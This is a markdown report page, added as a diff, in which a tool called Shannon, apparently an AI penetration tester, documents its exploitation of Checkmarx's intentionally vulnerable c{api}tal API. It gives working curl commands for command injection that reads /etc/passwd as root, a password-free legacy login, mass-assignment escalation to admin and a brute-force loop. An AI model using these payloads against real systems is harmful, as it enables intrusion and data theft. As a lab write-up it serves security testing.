@@ -1,0 +1,321 @@
+---
+title: c{api}tal API Report
+description: Shannon discovered 15 critical vulnerabilities including root-level command injection and complete authentication bypass
+---
+
+## Executive Summary
+
+**Target**: c{api}tal API ([GitHub](https://github.com/Checkmarx/capital))  
+**Assessment Date**: January 2025  
+**Scope**: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing
+
+Shannon identified **nearly 15 critical and high-severity vulnerabilities**, leading to full application compromise of c{api}tal, an intentionally vulnerable API from Checkmarx designed to test tools against the OWASP API Security Top 10.
+
+## Key Accomplishments
+
+### Complete Application Compromise
+
+- **Executed root-level command injection** by bypassing denylist via semicolon command chaining in hidden debug endpoint
+- **Achieved complete authentication bypass** by discovering and exploiting legacy v1 API endpoint
+- **Escalated regular user to full administrator privileges** via mass assignment vulnerability in profile update
+- **Demonstrated high accuracy** by correctly confirming robust XSS defenses with zero false positives
+
+### Verified Vulnerabilities by Category
+
+**Authentication Vulnerabilities:**
+- Complete authentication bypass on legacy v1 endpoint
+- Mass assignment privilege escalation
+- Session hijacking via JavaScript-accessible tokens in localStorage
+- Unlimited brute force attacks with no rate limiting
+
+**Authorization Vulnerabilities:**
+- Legacy authentication bypass providing complete account takeover
+- Horizontal authorization bypass accessing other users' financial data
+- Vertical authorization bypass allowing regular users to access admin functions
+- Mass assignment privilege escalation through profile updates
+- Command injection via debug endpoint providing root-level system access
+- Admin workflow bypass
+- Debug endpoint exposed in production
+
+**Cross-Site Scripting (XSS):**
+- **No XSS vulnerabilities found** - Application demonstrates robust XSS defenses through React's default HTML escaping, XSS library sanitization, and proper URL validation
+
+**SQL/Command Injection:**
+- Critical command injection in debug API endpoint allowing arbitrary command execution with root privileges
+- Semicolon command chaining bypass of input validation
+- Complete system compromise with sensitive data extraction
+
+**Server-Side Request Forgery (SSRF):**
+- Network boundary bypass via command injection in debug endpoint
+- SSRF to access internal services through Python socket connections
+
+## Critical Vulnerability Examples
+
+### INJ-VULN-01: Command Injection via Debug API Endpoint
+
+**Severity**: Critical  
+**Location**: `POST /api/debug` endpoint  
+**Impact**: Complete system compromise with root-level access, sensitive data extraction
+
+**Prerequisites**: Valid JWT authentication token (easily obtained via user registration)
+
+**Exploitation:**
+
+1. Register a user account to obtain JWT token:
+
+```bash
+curl -X POST "http://capital-api.sandbox.local:8000/api/users" \
+  -H "Content-Type: application/json" \
+  -d '{"user":{"username":"exploit9999","email":"exploit9999@test.com","password":"testpassword"}}'
+```
+
+Response includes JWT token: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...`
+
+2. Execute command injection to extract sensitive data:
+
+```bash
+curl -X POST "http://capital-api.sandbox.local:8000/api/debug" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Token [JWT_TOKEN]" \
+  -d '{"body":{"command":"uptime; cat /etc/passwd"}}'
+```
+
+3. Confirm root-level privilege escalation:
+
+```bash
+curl -X POST "http://capital-api.sandbox.local:8000/api/debug" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Token [JWT_TOKEN]" \
+  -d '{"body":{"command":"uptime; whoami; id; pwd"}}'
+```
+
+**Proof of Impact:**
+
+**Complete System Compromise Achieved:**
+
+- **Root Access Confirmed**: Command execution as root user (uid=0, gid=0)
+- **Sensitive Data Extracted**: Complete `/etc/passwd` file containing all system users
+- **System Information Gathered**: Working directory `/capital`, system uptime, load averages
+
+**Sample Extracted Data:**
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+[...complete user list...]
+```
+
+**User Context:**
+
+```
+uid=0(root) gid=0(root) groups=0(root)
+Working Directory: /capital
+```
+
+**Technical Details:**
+
+- **Vulnerability Type**: Command Injection (CWE-78)
+- **Root Cause**: Insufficient input validation with semicolon command chaining bypass
+- **Bypass Method**: Filter only blocks `"rm"` and `"||"` but allows semicolon (`;`) command chaining
+- **Attack Vector**: `uptime; [ARBITRARY_COMMAND]` pattern bypasses whitelist validation
+
+This represents one of the most severe types of vulnerabilities possible in a web application. An attacker could:
+- Extract all sensitive data from the filesystem
+- Install backdoors or malware
+- Pivot to other systems on the network
+- Cause complete system destruction
+- Access application databases and configuration files
+
+---
+
+### AUTH-VULN-06: Complete Authentication Bypass on Legacy v1 Endpoint
+
+**Severity**: Critical  
+**Location**: `/api/v1/users/login` endpoint  
+**Impact**: Complete authentication bypass enabling immediate account takeover of any user
+
+**Exploitation:**
+
+1. Target the legacy authentication endpoint:
+
+```bash
+curl -X POST http://capital-api.sandbox.local:8000/api/v1/users/login \
+  -H "Content-Type: application/json" \
+  -d '{"user": {"email": "Pikachu@checkmarx.com", "password": "anything"}}'
+```
+
+2. Endpoint returns successful authentication with user data and token:
+
+```json
+{
+  "user": {
+    "username": "Pikachu",
+    "email": "Pikachu@checkmarx.com",
+    "admin": false,
+    "token": "Keep it up!"
+  },
+  "flag": "flag{Impr0peR_Ass3ts_ManAg3m3nt}"
+}
+```
+
+3. Verify bypass works with any user and any password:
+
+```bash
+curl -X POST http://capital-api.sandbox.local:8000/api/v1/users/login \
+  -H "Content-Type: application/json" \
+  -d '{"user": {"email": "bob_dev@checkmarx.com", "password": "wrongpassword"}}'
+```
+
+**Proof of Impact**: Successfully authenticated as multiple users using completely wrong passwords. Flag `flag{Impr0peR_Ass3ts_ManAg3m3nt}` confirms successful exploitation.
+
+**Technical Details**: Legacy v1 endpoint completely bypasses password validation, allowing authentication with any email and any password. This represents improper asset management where deprecated endpoints remain accessible.
+
+---
+
+### AUTH-VULN-08: Mass Assignment Privilege Escalation
+
+**Severity**: Critical  
+**Location**: `PUT /api/user` endpoint  
+**Impact**: Any authenticated user can escalate to admin privileges
+
+**Prerequisites**: Valid JWT token from authentication
+
+**Exploitation:**
+
+1. Authenticate as a regular user:
+
+```bash
+curl -X POST http://capital-api.sandbox.local:8000/api/v2/users/login \
+  -H "Content-Type: application/json" \
+  -d '{"user": {"email": "Pikachu@checkmarx.com", "password": "snorlax"}}'
+```
+
+2. Escalate privileges via mass assignment:
+
+```bash
+curl -X PUT http://capital-api.sandbox.local:8000/api/user \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Token [JWT_TOKEN]" \
+  -d '{"user": {"admin": true}}'
+```
+
+3. Server responds with elevated privileges:
+
+```json
+{
+  "user": {
+    "username": "Pikachu",
+    "email": "Pikachu@checkmarx.com",
+    "admin": true,
+    "token": "[NEW_ADMIN_TOKEN]"
+  }
+}
+```
+
+**Proof of Impact**: Response shows `"admin": true` and includes flag `flag{M4sS_AsS1gnm3nt}` confirming successful privilege escalation from regular user to admin.
+
+**Technical Details**: User update endpoint allows setting `admin=true` via mass assignment without authorization checks. The application accepts arbitrary user-controlled attributes in the update payload.
+
+---
+
+### AUTH-VULN-04: Session Hijacking via JavaScript-Accessible Tokens
+
+**Severity**: High  
+**Location**: Frontend application localStorage storage  
+**Impact**: Any XSS vulnerability can steal authentication tokens and hijack user sessions
+
+**Exploitation:**
+
+1. Access the frontend application via browser:
+```
+https://capital-api.sandbox.local:4100
+```
+
+2. Demonstrate JavaScript access to stored tokens:
+
+```javascript
+// Simulate XSS attack stealing token
+const stolenToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...";
+localStorage.setItem('jwt', stolenToken);
+
+// Verify token is accessible
+localStorage.getItem('jwt'); // Returns the token
+```
+
+3. Use stolen token to access protected resources:
+
+```bash
+curl -X GET http://capital-api.sandbox.local:8000/api/user \
+  -H "Authorization: Token [STOLEN_JWT_TOKEN]"
+```
+
+**Proof of Impact**: Successfully demonstrated that JWT tokens can be injected and retrieved via JavaScript `localStorage.getItem('jwt')`. This proves any XSS attack can steal authentication tokens for session hijacking.
+
+**Technical Details**: JWT tokens stored in localStorage are accessible to JavaScript, enabling XSS-based session hijacking. Tokens should be stored in httpOnly cookies to prevent JavaScript access.
+
+---
+
+### AUTH-VULN-02: No Rate Limiting Enables Brute Force
+
+**Severity**: High  
+**Location**: `POST /api/v2/users/login`  
+**Impact**: Unlimited brute force attacks discovered valid credentials
+
+**Exploitation:**
+
+```bash
+# Test multiple passwords without rate limiting
+for password in test123 admin password123 snorlax; do
+  curl -X POST http://capital-api.sandbox.local:8000/api/v2/users/login \
+    -H "Content-Type: application/json" \
+    -d "{\"user\": {\"email\": \"Pikachu@checkmarx.com\", \"password\": \"$password\"}}"
+done
+```
+
+**Proof of Impact**: Successfully tested multiple passwords without rate limiting or account lockout. Discovered valid credentials through brute force.
+
+**Technical Details**: No rate limiting, CAPTCHA, or account lockout mechanisms protect the login endpoint, allowing unlimited authentication attempts.
+
+## XSS Defense Validation
+
+Shannon correctly identified that the application has **robust XSS defenses**:
+
+- React's default HTML escaping prevents injection
+- XSS library sanitization applied to user input
+- Proper URL validation prevents JavaScript protocol injection
+
+**Zero false positives reported** - Shannon only reports vulnerabilities it can successfully exploit.
+
+## Report Access
+
+View the complete penetration test report with all vulnerability details:
+
+[View Full Report →](https://github.com/KeygraphHQ/shannon/blob/main/sample-reports/shannon-report-capital-api.md)
+
+## Application Details
+
+**c{api}tal API** is an intentionally vulnerable API application from Checkmarx designed to test security tools against the OWASP API Security Top 10.
+
+- **GitHub**: [Checkmarx/capital](https://github.com/Checkmarx/capital)
+- **Purpose**: API security testing and training
+- **Technology**: Python, Flask, React
+- **Focus**: OWASP API Security Top 10 vulnerabilities
+
+## Key Takeaways
+
+Shannon's performance on c{api}tal demonstrates:
+
+1. **API-Specific Testing**: Specialized coverage of API security vulnerabilities
+2. **Critical Path Discovery**: Found hidden debug endpoints and legacy authentication paths
+3. **Zero False Positives**: Correctly identified robust XSS defenses without false reports
+4. **Root-Level Compromise**: Achieved complete system access through command injection
+5. **Real-World Impact**: Every finding demonstrates actual exploitability with PoC code
+
+## Next Steps
+
+- [View OWASP Juice Shop Report](/reports/juice-shop): Web application vulnerabilities
+- [View crAPI Report](/reports/crapi): Advanced JWT and authentication testing
+- [View Benchmark Results](/reports/benchmark-results): Quantitative performance analysis
+- [Get Started with Shannon](/quickstart): Test your own applications
